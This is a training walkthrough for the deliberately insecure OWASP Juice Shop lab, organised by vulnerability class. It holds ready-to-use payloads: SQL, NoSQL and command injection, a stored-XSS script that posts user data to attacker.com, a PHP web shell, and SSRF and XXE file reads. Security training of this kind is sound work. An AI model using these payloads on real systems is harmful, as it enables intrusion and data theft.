# OWASP Juice Shop Labs - Complete Walkthrough

## Overview

OWASP Juice Shop is an intentionally insecure web application for security training, awareness demos, CTFs and as a guinea pig for security tools. This guide provides hands-on walkthroughs for various security challenges with practical payloads and solutions.

## Lab Setup

### Installation Options

1. **Docker (Recommended)**
   ```bash
   docker pull bkimminich/juice-shop
   docker run --rm -p 3000:3000 bkimminich/juice-shop
   ```

2. **Node.js Installation**
   ```bash
   git clone https://github.com/bkimminich/juice-shop.git
   cd juice-shop
   npm install
   npm start
   ```

3. **Access**: http://localhost:3000

## Challenge Categories

### 1. Injection Vulnerabilities

#### SQL Injection - Login Bypass

**Objective**: Bypass authentication using SQL injection

**Location**: Login form (/login)

**Steps**:
1. Navigate to login page
2. In email field, enter: `' OR 1=1--`
3. Enter any password
4. Click Login

**Payload Explanation**:
- `'` - Closes the email string
- `OR 1=1` - Always true condition
- `--` - SQL comment to ignore password check

**Expected Result**: Logged in as admin user

#### NoSQL Injection - User Enumeration

**Objective**: Extract user information via NoSQL injection

**Location**: REST API endpoints

**Payload**:
```javascript
{
  "email": {"$ne": null},
  "password": {"$ne": null}
}
```

**Steps**:
1. Intercept login request with Burp Suite
2. Modify JSON payload
3. Observe response for user enumeration

#### Command Injection - File Access

**Objective**: Execute system commands

**Location**: Feedback form or file upload

**Payload**:
```bash
; ls -la
; cat /etc/passwd
; whoami
```

### 2. Cross-Site Scripting (XSS)

#### Reflected XSS - Search Function

**Objective**: Execute JavaScript in victim's browser

**Location**: Search functionality

**Payload**:
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

**Steps**:
1. Navigate to search page
2. Enter XSS payload in search field
3. Observe script execution

#### Stored XSS - User Profile

**Objective**: Store malicious script in application

**Location**: User profile/bio section

**Advanced Payload**:
```html
<script>
  fetch('/api/users').then(r=>r.json()).then(data=>{
    fetch('http://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
</script>
```

#### DOM XSS - URL Fragment

**Objective**: Exploit client-side DOM manipulation

**Payload**:
```html
#<script>alert('DOM XSS')</script>
#<img src=x onerror=alert(document.cookie)>
```

### 3. Authentication & Authorization

#### Broken Authentication - Password Reset

**Objective**: Reset another user's password

**Steps**:
1. Request password reset for your account
2. Intercept the reset request
3. Change the email parameter to target user
4. Complete password reset

**Payload**:
```http
POST /rest/user/reset-password
Content-Type: application/json

{"email": "admin@juice-sh.op", "answer": "guessed_answer"}
```

#### JWT Token Manipulation

**Objective**: Modify JWT tokens for privilege escalation

**Steps**:
1. Login and capture JWT token
2. Decode token at jwt.io
3. Modify payload (role: admin)
4. Sign with known/weak secret

**Example Token Manipulation**:
```json
{
  "data": {
    "id": 1,
    "email": "admin@juice-sh.op",
    "role": "admin"
  }
}
```

### 4. Business Logic Flaws

#### Price Manipulation

**Objective**: Purchase items for negative prices

**Steps**:
1. Add item to basket
2. Intercept basket update request
3. Modify quantity to negative value
4. Proceed to checkout

**Payload**:
```json
{
  "ProductId": 1,
  "BasketId": "session_id",
  "quantity": -1
}
```

#### Coupon Code Bypass

**Objective**: Apply expired or invalid coupons

**Method**: Direct API manipulation
```json
{
  "couponData": "EXPIRED_COUPON",
  "discount": 90
}
```

### 5. File Upload Vulnerabilities

#### Malicious File Upload

**Objective**: Upload executable files

**Bypasses**:
1. **Double Extension**: `malicious.php.jpg`
2. **MIME Type Spoofing**: Change Content-Type header
3. **Magic Bytes**: Add image header to PHP file

**Web Shell Payload**:
```php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

### 6. Server-Side Request Forgery (SSRF)

#### Internal Port Scanning

**Objective**: Access internal services

**Payload**:
```
http://localhost:22
http://localhost:3306
http://127.0.0.1:6379
file:///etc/passwd
```

**Steps**:
1. Find URL parameter accepting external URLs
2. Try internal addresses
3. Observe response differences

### 7. XML External Entity (XXE)

#### File Disclosure via XXE

**Objective**: Read sensitive files from server

**Payload**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <name>&xxe;</name>
</root>
```

### 8. Insecure Direct Object Reference (IDOR)

#### User Data Access

**Objective**: Access other users' data

**Steps**:
1. Identify user ID in requests
2. Increment/modify ID parameter
3. Access unauthorized data

**Example**:
```
/api/users/1/orders
/api/users/2/orders  # Try different IDs
/api/users/admin/orders
```

## Advanced Exploitation Scenarios

### Multi-Stage Attack Chain

1. **Reconnaissance**: Information gathering
2. **XSS**: Steal session cookies
3. **Session Hijacking**: Impersonate admin
4. **Privilege Escalation**: Access admin functions
5. **Data Exfiltration**: Extract sensitive data

### Automated Testing

#### Using OWASP ZAP
```bash
# Spider the application
zap-cli spider http://localhost:3000

# Active scan
zap-cli active-scan http://localhost:3000

# Generate report
zap-cli report -o juice-shop-report.html
```

#### Using Burp Suite
1. Configure proxy settings
2. Browse application through proxy
3. Use Scanner for automated testing
4. Manual testing with Repeater

## Defensive Measures

### Input Validation
```javascript
// Sanitize user input
const validator = require('validator');

function sanitizeInput(input) {
    return validator.escape(input);
}
```

### Parameterized Queries
```sql
-- Instead of string concatenation
SELECT * FROM users WHERE email = ? AND password = ?
```

### Content Security Policy
```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' 'unsafe-inline'">
```

## Tools and Resources

### Essential Tools
- **Burp Suite**: Web application security testing
- **OWASP ZAP**: Free security scanner
- **SQLmap**: Automated SQL injection testing
- **Postman**: API testing
- **Browser Dev Tools**: Client-side analysis

### Useful Payloads Repository
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [SecLists](https://github.com/danielmiessler/SecLists)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

## Challenge Solutions Summary

| Challenge | Technique | Difficulty | Points |
|-----------|-----------|------------|---------|
| Login Bypass | SQL Injection | ⭐ | 100 |
| XSS Search | Reflected XSS | ⭐ | 100 |
| File Upload | Malicious Upload | ⭐⭐ | 200 |
| JWT Cracking | Crypto Analysis | ⭐⭐⭐ | 300 |
| SSRF | Internal Access | ⭐⭐⭐ | 300 |
| XXE Attack | XML Parsing | ⭐⭐⭐⭐ | 400 |

## Best Practices for Labs

1. **Document Everything**: Keep detailed notes of findings
2. **Understand Impact**: Assess real-world implications
3. **Practice Remediation**: Learn how to fix vulnerabilities
4. **Stay Updated**: Follow latest security trends
5. **Ethical Approach**: Only test authorized systems

## Additional Resources

- [OWASP Juice Shop Official Guide](https://pwning.owasp-juice.shop/)
- [Web Security Academy](https://portswigger.net/web-security)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE/SANS Top 25](https://cwe.mitre.org/top25/)

---

**Note**: This lab environment is for educational purposes only. Always obtain proper authorization before testing security measures on any system.

**Happy Hacking! 🛡️**
